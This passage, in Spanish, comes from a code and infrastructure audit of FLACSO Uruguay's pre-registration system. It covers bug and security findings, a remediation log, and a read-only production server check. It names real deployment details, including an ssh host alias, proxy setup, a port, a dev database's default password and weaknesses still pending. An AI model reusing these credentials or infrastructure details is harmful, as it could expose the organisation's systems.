9. Eliminar el sistema de perfiles legacy, SES, tablas sin uso y `ProfileVersionEditor`.
10. Extraer duplicaciones (sección 4); mover Drive/Sheets a trabajo en segundo plano; política de retención y borrado de datos personales (F-15); reducir el alcance de la cuenta de servicio (F-16).

---

## 11. Incorporación del segundo informe ("Diagnóstico Integral" con WordPress)

Cada punto se contrastó con el código. "Coincide" = ya estaba en las secciones anteriores.

### Coincidencias
| Segundo informe | Este informe |
|---|---|
| 1.1 nginx rechaza > 1 MB | F-05 |
| 1.2.2 Mautic nunca corre en producción | F-03 |
| 1.2.3 worker del compose local sin clave de cifrado ni volumen `upload_tmp` | F-13 |
| 1.4 `TemporaryFileStorage` sin repositorio | F-10 (y F-36, más grave) |
| 3.2 `ADMIN_ALLOWED_EMAILS` ignorado, `pendingStates` sin consumir | F-17 y F-06 |
| 3.3 la subida revalida contra WordPress en vivo | F-22 |

### Hallazgos nuevos

**F-27 · ALTO · Producción no pasa `WORDPRESS_CATALOG_TOKEN` [CONFIRMADO]**
`deploy/docker-compose.production.yml` (servicio `api`) no lo define y `.env.production.example` tampoco. Sin el token WordPress entrega el catálogo público, sin `notificationEmails` (`class-preinscriptions-rest.php`): las coordinaciones de cada oferta o seminario no reciben ningún correo y nada falla visiblemente (solo un `console.warn` en `main.ts`). Corrección: añadirlo como variable obligatoria (`:?`) y documentarlo; debe coincidir con `FLACSO_PREINSCRIPCIONES_CATALOG_TOKEN` de `wp-config.php` (≥ 32 caracteres).

**F-28 · ALTO · Segunda revalidación en el envío anula la tolerancia a caídas [CONFIRMADO]**
`submission-routes.ts:284` repite `catalog.revalidateTarget(targetId)` antes de escribir en Sheets, aunque `submitPreinscription` ya validó (con respaldo en caché de 6 h) y devolvió `result.target`. Si WordPress falla en ese instante, el postulante ya subió sus archivos a Drive pero el envío queda `failed` (202) con un caso de recuperación. Corrección: usar `result.target`.

**F-29 · MEDIO · `attempt_count` se incrementa dos veces [CONFIRMADO]**
Un fallo llama a `recordProcessingFailure` (`postgres-submission-repository.ts`, `ON CONFLICT … +1`) y luego a `recordFailure` (`postgres-submission-recovery-repository.ts:57`, mismo `ON CONFLICT … +1`): todo primer fallo aparece con 2 intentos. En el reintento, `markRetryResult` (`…recovery-repository.ts:254`) incrementa y después `recordProcessingFailure` vuelve a hacerlo. Matiz: `recordProcessingFailure` es el único que actualiza `submission_processing`, y `recordFailure` el único que devuelve el `id` usado en la alerta de Telegram; no basta con borrar una llamada.

**F-30 · ALTO · Redirecciones legacy de WordPress llevan a rutas no reconocidas [CONFIRMADO]**
`class-flacso-legacy-redirects.php` redirige (301) a `/ofertas/{slug}/` y `/seminarios/{slug}/` (plural). El generador de enlaces (`canonical_parent_url`) y la app (`legacy-permalink-resolution.ts`, regex `^\/(oferta|seminario)\/[^/]+\/$`) usan singular. Quien llega por un enlace antiguo ve "No encontramos una preinscripción para este enlace." Los 301 son cacheables por el navegador: corregir el servidor y además tolerar el plural en la app (`normalizePath` y `normalizePermalink`). Los fixtures del tema usan un tercer formato (`/ofertas/10/cohortes/100/`) que tampoco se reconoce.

**F-31 · BAJO · `configRevision` no se recalcula tras resolver conflictos [CONFIRMADO]**
Se calcula en `for_cohort`/`for_edition` (serializador, l. 118 y 223); `resolve_*_availability` (l. 271-325) cambia la disponibilidad después sin tocarla.

**F-32 · MEDIO · La caché del catálogo no se invalida al editar un `seminario` [CONFIRMADO]**
`class-preinscriptions-cache.php` escucha `cohorte`, `edicion` y `oferta-academica`, no `seminario`, cuyo título, slug y correo se serializan en las ediciones.

**F-33 · MEDIO · Seminarios integrados pueden quedar en conflicto con sus componentes [PLAUSIBLE]**
El plugin copia el enlace de la integrada a los componentes y `resolvePermalinks` marca conflicto si hay más de una edición abierta con el mismo enlace. No lo reproduje con datos reales.

**F-34 · MEDIO · `carta.php` muestra siempre el botón de preinscripción [CONFIRMADO]**
`kadence-child-flacso/template-parts/oferta/carta.php:145` fija `$inscripciones_abiertas = true;` y se usa en las líneas 390, 755, 937 y 950.

**F-35 · BAJO-MEDIO · La portada agrupa seminarios pero no cohortes [CONFIRMADO en código]**
`HomePage.tsx` aplica `groupSeminarsByPermalink` solo a seminarios; `academicOffers` va sin agrupar y `availableCount` cuenta destinos crudos.

---

## 12. Incorporación del tercer informe ("Auditoría Técnica Completa")

El documento llegó truncado en la sección 6.3 (SMTP/OIDC sin timeouts), por lo que no pude leer su cierre. Resultado de contrastarlo con el código:

### Afirmación refutada
- **"Quitar un archivo en el wizard no llama a `DELETE /api/uploads/:token` y bloquea la re-subida con `MAX_FILES_EXCEEDED"` (su 1.1): NO se sostiene.** `handleRemoveToken` del wizard solo actualiza el estado, pero los botones reales (`DocumentUploadFields.tsx:40,111` y `TitleDocumentFields.tsx:44,72`) llaman a `apiClient.removeUpload` **antes** de `onRemoveToken`. Queda un riesgo menor, **F-47**: esas llamadas usan `catch {}`, de modo que si el `DELETE` falla la interfaz muestra el archivo como quitado pero el servidor lo conserva, y la siguiente subida sí recibe `MAX_FILES_EXCEEDED`. Es cierto además que `TitleDocumentFields.handleFileChange` no restablece `event.target.value`, y entonces el navegador no dispara `change` si se vuelve a elegir el mismo archivo.

### Coincidencias
Bypass de `files` (su 1.4 = F-08), nginx 1 MB (F-05), Mautic y token (F-03, F-27), idempotencia (su 1.8 = F-07), revalidación redundante (su 1.9 = F-28), doble incremento (su 1.10 = F-29), carrera en Sheets (F-02), OIDC (F-06, F-17), fórmulas (F-01), `targetId` opcional y sin magic bytes (F-10), `Express 4` con `@types/express 5` (F-04), duplicaciones de `safeError` y cookie (sección 4), código muerto de perfiles y SES (sección 5), contenedores root y cabeceras (F-13, F-14).

### Hallazgos nuevos confirmados

**F-36 · ALTO · La recuperación administrativa de envíos con adjuntos falla siempre con `MISSING_FILE` [CONFIRMADO]**
`retry-failed-submission.ts` abre el archivo con `storage.open(file.token)` sin `sessionId`. Como `main.ts:61` no conecta el repositorio, `TemporaryFileStorage.open` usa la rama de disco (`temporary-file-storage.ts:111`) y compara `metadata.sessionId !== sessionId`; con `sessionId` indefinido siempre lanza. El `catch` lo interpreta como archivo vencido. Así, la función cuyo propósito es salvar envíos con documentos tras un fallo de Drive **nunca puede recuperarlos**, aunque los archivos sigan en disco. Corrección: que el reintento administrativo use una vía de apertura sin sesión (p. ej. `openAsAdmin(token)`) o conectar el repositorio de Postgres.

**F-37 · ALTO · Un reenvío con el mismo `clientSubmissionId` puede marcar como fallido un envío ya exitoso [CONFIRMADO en lógica]**
Extiende F-07. El primer envío borra los temporales (`submission-routes.ts:441`); el segundo falla en `storage.open`, entra al `catch` y llama `recordProcessingFailure`, que cambia a `failed` una preinscripción exitosa, crea un caso de recuperación falso y manda una alerta a Telegram. Sin archivos adjuntos, en cambio, duplica la fila de Sheets. Hoy solo ocurriría con clientes que envíen `clientSubmissionId` (la web no lo hace).

**F-38 · ALTO · `collapseLegacySpreadsheetRow` sobrescribe "Posgrado en FLACSO" y "Convenio" con `'No'` [CONFIRMADO]**
Para esas columnas solo lee las columnas legacy (`¿Cursó posgrado en FLACSO?`, `¿Te corresponde algún convenio?`). En una hoja que ya tiene el encabezado canónico y no las legacy, `legacy.get(...)` es indefinido y devuelve `'No'`, **borrando los valores existentes**. `reconcileTargets` invoca `synchronizeSchema` sobre cada hoja, así que ocurre en cada reconciliación. Se suma a F-20 (hipervínculos perdidos). Corrección: si la columna destino ya existe en la hoja, conservar su valor.

**F-39 · MEDIO-ALTO · Los errores de campo del servidor no se ven en la pantalla de resumen [CONFIRMADO]**
`validateStep` del cliente solo exige campos no vacíos; no valida dígito verificador de cédula, teléfono ni formato de correo. Si el servidor responde `400` con `fieldErrors` desde la pantalla de resumen, `TargetPage` los guarda en `serverErrors`, pero en la rama `isReviewing` el wizard solo muestra `serverErrors._form`; no renderiza `FormErrorSummary` ni vuelve al paso con error. El usuario no ve ningún mensaje. Corrección: al recibir `fieldErrors` salir de la revisión y llevar al primer paso con error, y reutilizar `isValidUruguayanCedula`/`normalizePhoneToE164` en el cliente.

**F-40 · MEDIO · Colisión de nombres en Drive en los reintentos [CONFIRMADO]**
En `storeSubmissionFiles`, si un archivo ya existe (`findExistingFile`) se hace `continue` antes de `ordinals.set(...)`. En un reintento, el siguiente archivo del mismo campo (p. ej. identidad, `maxFiles: 2`) recibe `ordinal = 1` y el mismo nombre que el primero.

**F-41 · MEDIO · Un mismo token puede usarse en varios campos [CONFIRMADO]**
El envío abre `storage.open(file.token, sessionId)` pero no compara el `fieldKey` del cliente con el guardado, ni exige tokens únicos. Se puede subir una imagen a `identidad` y declararla también como `cv`, `titulo` y `cartaMotivacion`. Además `submission_files` usa `onConflict(token).doNothing()`, y el token puede reaparecer en otro envío.

**F-42 · MEDIO · El reintento pierde `documentsFolderUrl` [CONFIRMADO]**
En `retry-failed-submission.ts` la variable se inicializa en `''` y solo se rellena si se vuelven a subir archivos. Si Drive había tenido éxito en el intento original, la fila de Sheets del reintento queda sin enlace a la carpeta y las notificaciones también.

**F-43 · MEDIO · `getTargetForm` usa un destino obsoleto [CONFIRMADO]**
`get-target-form.ts` obtiene `target` con `getTarget` (caché), luego llama a `revalidateTargets()` para resolver conflictos, pero compone el formulario y comprueba `registrationOpen` con el `target` anterior en lugar del revalidado.

**F-44 · MEDIO · Las sesiones de administración expiradas no se purgan [CONFIRMADO]**
`PostgresAdminSessionStore.cleanExpiredSessions` existe pero nadie la invoca.

**F-45 · MEDIO · La migración de planillas borra antes de escribir [CONFIRMADO]**
`migrate-target-spreadsheets.ts:238-248` ejecuta `clearValues` y después `updateValues`. Si la segunda falla por red o cuota, la hoja queda vacía. Corrección: escribir primero (o usar `batchUpdate` atómico) y limpiar solo el sobrante.

**F-46 · BAJO-MEDIO · Dos pequeñas inconsistencias de datos [CONFIRMADO]**
(a) `formatUruguayanCedula` solo formatea si hay 8 dígitos; `isValidUruguayanCedula` sí acepta 7 (con `padStart`), de modo que una cédula válida de 7 dígitos se guarda sin formato. (b) La tabla `system_settings` no está declarada en `DatabaseSchema`, por eso su repositorio usa `Kysely<any>`.

**F-48 · BAJO · Interfaz [CONFIRMADO]**
(a) El `202 pending_processing` se muestra con el mismo cartel de éxito que el `201` (`client.ts` devuelve `res.json()` sin distinguir estado; `TargetPage` muestra "¡Preinscripción enviada con éxito!"). (b) La app no incluye Tailwind (no está en `package.json`), pero usa clases utilitarias; `app.css` define a mano solo algunas (`.flex`, `.min-h-screen`…). `animate-spin` no existe en `app.css`, de modo que el indicador de carga no gira. (c) No hay timeouts explícitos en `smtp-email-provider.ts` ni en `google-oidc.ts`.

**F-49 · BAJO · Otras observaciones de seguridad**
`google-drive-repository.ts` escapa `'` pero no `\` en las consultas `q` (los nombres vienen de WordPress, de modo que el riesgo es bajo). `encrypted-settings.ts` no valida la longitud del IV ni fija `authTagLength: 16` en `createDecipheriv`.

### Hallazgos del tercer informe que no pude verificar (leer como "a verificar")
- **Correos**: documentos adjuntos que aparecen como `'-'` y convenio mostrado como ID numérico (`create-preinscription-notifications.ts`, `notification-snapshot.ts`).
- **Administración**: `provider ?? 'smtp'` pisa `'mautic'` en `admin-settings-routes.ts:485`; `/email/test` y `/email/verify` exigen SMTP e ignoran Mautic; los campos SMTP son `required` aun con proveedor Mautic; el listado de recuperaciones no devuelve `targetTitle` ni `filesCount`.
- **Wizard**: el país del teléfono (`phoneCountry`) se reinicia a `'UY'` al cambiar de paso (`UniversalFields.tsx`).
- **Inconsistencias de datos**: `offerType` por defecto `'diploma'` frente a `diagnostics.ts` y `canProvisionTargetSpreadsheet`; nombre de pestaña (`Inscripciones`, `Preinscripciones`, `Sheet1`) distinto entre aprovisionamiento y migración; columnas no requeridas descartadas si faltan los encabezados; variables de entorno desparejas entre ejemplos y compose.
- Lo que contiene el final truncado del documento.

### Plan de remediación (fase 1) ampliado
A la fase 1 de la sección 10 se suman, en este orden de impacto:
1. F-36 (recuperación con adjuntos) y F-38/F-20/F-45 (no destruir datos al reconciliar planillas).
2. F-27 (token de WordPress en producción), F-28 (quitar la segunda revalidación) y F-30 (redirecciones).
3. F-39 (errores de campo visibles), F-34 (`carta.php`), F-32 (caché de seminario), F-29 y F-37.
4. Resto de F-40 a F-49 en la fase 2.

---

## 13. Estado de remediación (2026-10-25)

Verificación tras los cambios: typecheck limpio en API y web; API 473 tests y web 100 tests en verde (los 28 tests de PostgreSQL siguen saltándose sin base de pruebas). Los contratos (`packages/contracts`) se recompilan con `tsc` antes de probar la API, porque se resuelven desde `dist/`.

### Resuelto
| Hallazgo | Qué se hizo |
|---|---|
| F-01, F-21 | `escapeSheetText`: los textos del postulante que empiezan por `= + - @` (o son números con ceros a la izquierda) se guardan como texto; se respetan solo los hipervínculos propios a Drive |
| F-02 | Las escrituras a una misma planilla se serializan (`GoogleSheetsRepository`) |
| F-04 | `createAsyncRouter` reenvía los errores de handlers `async` al manejador central; `unhandledRejection`, error del pool de `pg` y apagado ordenado en `main.ts` |
| F-05, F-14 | nginx: `client_max_body_size 30m`, timeouts, `X-Forwarded-*` y cabeceras de seguridad |
| F-06, F-17 | `state` obligatorio y de un solo uso, `nonce` guardado en el servidor, `ADMIN_ALLOWED_EMAILS` respetada, id por administrador, CSRF en tiempo constante, 403 sin revelar el correo autorizado |
| F-07, F-37 | `clientSubmissionId` desde la web; el servidor devuelve el envío original (`200 existing`) sin repetir efectos |
| F-08, F-11, F-41 | Documentos obligatorios exigidos aunque falte `files`; se descartan claves ajenas al formulario; largo máximo y fecha válida; tokens únicos y atados al campo con el que se subieron |
| F-09 | Google reCAPTCHA v3 con claves en el panel (pestaña "Seguridad"), límite por IP (con 2 proxies de confianza) y por correo |
| F-10 | `targetId` obligatorio en la subida y verificación de la firma real del archivo (PDF, JPG, PNG, WebP) |
| F-12 | La clave de cifrado de ejemplo y las claves cortas se rechazan |
| F-15 (parcial) | Mautic solo recibe contactos con consentimiento explícito: nueva pregunta obligatoria `aceptaComunicaciones` (formulario canónico v2) |
| F-19, F-29 | Reintento: sin doble conteo de intentos y sin romper la planilla si el formulario no compone |
| F-20, F-38, F-45 | Se leen las fórmulas (no el texto visible), "Posgrado" y "Convenio" ya consolidados no se pisan, y la migración escribe antes de limpiar |
| F-22 (parcial), F-28, F-43 | Se usa el destino ya validado; `getTargetForm` compone con el destino revalidado |
| F-27 | `WORDPRESS_CATALOG_TOKEN` obligatorio en el compose de producción y documentado |
| F-36 | El reintento administrativo puede abrir los archivos temporales sin sesión |
| F-40, F-49 | Ordinales de archivos estables en reintentos; escape de `\` en consultas de Drive |
| F-44 | Las sesiones de administración vencidas se purgan |
| Sección 5 | Eliminados el sistema de perfiles de formulario (rutas, repositorios, composición, `form-profiles`), el cliente de SES y `ProfileVersionEditor` junto con los métodos web de perfiles. Las tablas se conservan. `AdminUser` y los tipos de oferta pasaron a `domain/admin-user.ts` y `domain/offer-types.ts` |
| F-30, F-31, F-32, F-34, F-35 | Aplicados en paralelo por otra sesión sobre WordPress, el tema y `HomePage` (no revisados aquí) |
| F-47, F-48 | Se puede volver a elegir el mismo archivo, el envío en estado pendiente se explica y el indicador de carga gira |

### Resuelto en la segunda tanda
| Hallazgo | Qué se hizo |
|---|---|
| F-15 | Retención: pasados 90 días (`NOTIFICATION_PAYLOAD_RETENTION_DAYS`) se vacían los datos del postulante de las notificaciones ya **enviadas**; las pendientes, fallidas o desconocidas conservan el contenido para poder reintentarse. Corre cada 15 minutos junto con la limpieza existente. Siguen guardados el correo del destinatario, el estado y las fechas |
| F-13 (parcial) | La imagen de la API baja de `root` a `node` mediante `docker-entrypoint.sh` (ajusta el dueño del directorio de subidas). **Sin probar en una compilación real**: Docker Desktop estaba apagado |
| CI | `.github/workflows/ci.yml`: typecheck, tests con PostgreSQL 17 de prueba y validación de ambos `docker-compose` (detecta claves duplicadas y variables obligatorias sin definir) |
| Documentación | `.env.example` indicaba `PREINSCRIPCIONES_TEST_DATABASE_URL`, pero los tests leen `PREINSCRIPTIONS_TEST_DATABASE_URL`: quien seguía el ejemplo nunca activaba los tests de integración |

### Decisiones tomadas
- reCAPTCHA v3 estándar de Google; si no está activado en el panel, o Google no responde, el formulario sigue funcionando (el límite de frecuencia protege igual).
- `aceptaDifusion` pregunta por el uso de la **imagen**; el contacto en Mautic depende de la pregunta nueva `aceptaComunicaciones`.
- La dependencia `@aws-sdk/client-sesv2` sigue en `package.json`: quitarla exige regenerar `pnpm-lock.yaml` (el Dockerfile instala con `--frozen-lockfile`).

### Pendiente
- Servicios del compose local expuestos (F-13) y el contenedor `web` (nginx) sigue con su usuario por defecto.
- Que el reintento conserve `documentsFolderUrl` (F-42), y el resto de F-23 (carpetas duplicadas en Drive bajo concurrencia).
- Tabla de control de migraciones (F-24).
- Retención del resto de datos personales: `submission_values`, `profile_snapshot` y las planillas de Google no se purgan (solo se aplicó a las notificaciones).
- ESLint.
- Código muerto menor (`startNotificationSupervisor`, `calculateNextAttemptTime`, etc.) y `docs/superpowers/`.
- Los 28 tests de PostgreSQL y los e2e no se pudieron ejecutar; en particular `findByClientSubmissionId` del repositorio Postgres está sin probar contra una base real.

---

## 14. Verificación en el servidor de producción (2026-10-25, solo lectura)

Acceso por `ssh servidor-flacso` (AWS EC2, Ubuntu, ISPConfig). Solo se ejecutaron comandos de lectura: conteos agregados de la base, estado de contenedores, nombres de variables (nunca sus valores), permisos de archivos y logs filtrados. No se modificó nada.

### Estado del despliegue
- Producción corre el commit `cbebc8c` (7 de octubre): **18 commits por detrás** del repositorio local. Funcionan 22 preinscripciones registradas (20 exitosas, 2 fallidas) entre el 5 y el 23 de octubre.
- No existen todavía la tabla `mautic_contact_sync` ni la columna `submissions.catalog_validation`: el próximo despliegue ejecutará las migraciones 019 a 023, incluida la 021, que **elimina** `registration_event_outbox` (irreversible; contenía correos de postulantes pendientes de enviar).
- Apache hace `ProxyPass` a `127.0.0.1:3300` con `ProxyTimeout 120` y agrega `X-Forwarded-Proto`; el dominio apunta directo al servidor (sin CDN). Son exactamente **2 proxies** (Apache → nginx), por lo que `TRUST_PROXY_HOPS=2` es correcto.

### Hallazgos confirmados con datos reales
| Hallazgo | Evidencia en producción |
|---|---|
| F-05 (nginx 1 MB) | **32 respuestas 413** en el log de nginx, **31 de ellas en `POST /api/uploads`** (frente a 73 subidas exitosas): postulantes reales no pudieron adjuntar documentos. El nginx desplegado no define `client_max_body_size` |
| F-27 (token del catálogo) | `WORDPRESS_CATALOG_TOKEN` no está en `.env.production` ni en el contenedor. En 20 preinscripciones exitosas hay 20 correos al postulante y 40 a "master", pero **0 a las coordinaciones de oferta** (`audience = 'target'`). Además la constante `FLACSO_PREINSCRIPCIONES_CATALOG_TOKEN` **tampoco está definida en ningún `wp-config.php`** del servidor |
| F-18 (WordPress) | El catálogo público devuelve 76 destinos, **todos con `urls.edit`** (enlace a `wp-admin`), y 0 con correos de notificación |
| F-22 (subida y WordPress) | 3 respuestas 500 en `/api/uploads` y 3 errores "No se pudo conectar con WordPress: timeout" en el log de la API |
| F-04 (caída por error de pool) | El log de la API conserva `Unhandled 'error' event ... terminating connection due to administrator command`: el proceso se cayó cuando se reinició PostgreSQL, exactamente el escenario corregido en `kysely.ts` |
| F-07 (idempotencia) | 0 de 22 envíos tienen `client_submission_id` |
| F-44 (sesiones) | 8 sesiones administrativas guardadas, las 8 vencidas |
| F-36 (recuperación con adjuntos) | Un envío fallido (8 de octubre) terminó con "No se pudo recuperar: el archivo temporal … expiró o no se encuentra disponible" |

### Otros hallazgos del servidor
- **Contenedor `preinscripciones-postgres` olvidado**: es el PostgreSQL del `docker-compose.yml` de **desarrollo** (creado el 3 de octubre desde `/opt/flacso/preinscripcionesFLACSOUY/current/docker-compose.yml`), con usuario `flacso` y contraseña por defecto `flacso_password`, publicado en `0.0.0.0:5433`. La base `flacso_preinscripciones` **no tiene tablas** (no hay datos personales) y el puerto **no es alcanzable desde Internet** (probado desde fuera; lo bloquea el grupo de seguridad de AWS). `ufw` está inactivo, de modo que dependen únicamente de AWS. Conviene detenerlo y eliminarlo.
- **Sin respaldos periódicos**: los únicos respaldos son los que toma `deploy-production.sh` en cada despliegue; el último es del 7 de octubre y no hay tarea `cron` de `pg_dump`. Las preinscripciones posteriores no están respaldadas.
- **Secretos compatibles con la imagen sin root**: `.secrets/*.json` pertenecen al uid 1000 con modo 600, que es el mismo uid del usuario `node` de la imagen, de modo que el nuevo entrypoint podrá leerlos sin caer a root. El volumen de subidas pertenece a `root`: el `chown` automático lo corregirá.
- **Clave de cifrado**: `APP_SETTINGS_ENCRYPTION_KEY` mide 44 caracteres (no es hexadecimal de 64). La validación nueva la sigue aceptando (≥ 32 caracteres, no es el valor de ejemplo) y se deriva igual que antes, de modo que los secretos ya guardados siguen descifrándose.
- Espacio en disco: 67 % usado (35 GB libres). `.env.production` tiene modo 600.

### Requisitos antes del próximo despliegue
1. **Definir `FLACSO_PREINSCRIPCIONES_CATALOG_TOKEN` en el `wp-config.php` del sitio de WordPress y el mismo valor como `WORDPRESS_CATALOG_TOKEN` en `.env.production`** (mínimo 32 caracteres). El compose de producción ahora lo exige: sin la variable, `docker compose config` falla y el despliegue se detiene antes de tocar nada.
2. Dejar `TRUST_PROXY_HOPS` sin definir (el valor por defecto en producción ya es 2) o fijarlo en 2.
3. Tras desplegar: cargar las claves de reCAPTCHA v3 en el panel (pestaña "Seguridad") y activarlo.
4. Verificar que Apache envía `X-Forwarded-For` (lo hace `mod_proxy` por defecto) mirando que el límite por IP no bloquee a todos a la vez.
5. Programar un `pg_dump` periódico y retirar el contenedor `preinscripciones-postgres`.

### Acciones aplicadas en el servidor (2026-10-25, a pedido)
1. **Retirado el PostgreSQL de desarrollo olvidado** (`preinscripciones-postgres`): detenido y eliminado tras verificar 0 conexiones activas. El puerto 5433 ya no escucha; el volumen `current_postgres_data` se conservó (la base estaba vacía) y el stack de producción siguió sano (`/api/health` 200).
2. **Respaldo diario instalado** en `/opt/flacso/preinscripcionesFLACSOUY/backup-db.sh` (versión del repositorio: `scripts/backup-db.sh`) y programado con `cron` del usuario `ubuntu` todos los días a las 03:00 (hora del servidor, UTC-3). Primera corrida de prueba correcta: 67 588 bytes, `gzip -t` íntegro, 23 tablas y las 22 preinscripciones en el volcado. Archivos con modo 600 en `/opt/flacso/backups/preinscripcionesFLACSOUY/daily/`, retención de 14 días, registro en `backup.log`.

Siguen sin hacerse (requieren decisión o datos que no tengo): definir el token de WordPress en `wp-config.php` y `.env.production`, desplegar, y cargar las claves de reCAPTCHA. Los respaldos viven en el mismo disco del servidor; conviene copiarlos fuera de la máquina.
